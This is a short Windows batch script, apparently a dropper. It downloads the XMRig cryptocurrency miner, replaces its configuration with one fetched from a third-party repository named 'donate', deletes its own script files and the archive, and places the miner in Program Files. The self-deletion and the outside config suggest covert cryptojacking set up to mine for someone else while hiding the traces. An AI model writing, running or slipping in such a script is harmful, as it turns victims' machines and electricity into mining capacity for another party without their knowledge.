curl -OL https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-gcc-win64.zip
tar -xf xmrig-6.16.2-gcc-win64.zip
curl -OL https://raw.githubusercontent.com/1nachi/donate/main/config.json
del xmrig-6.16.2\config.json
move config.json xmrig-6.16.2
del xmrig-6.16.2-gcc-win64.zip
del xmrig.bat.bak
del xmrig.bat
move xmrig-6.16.2 "C:\Program Files"
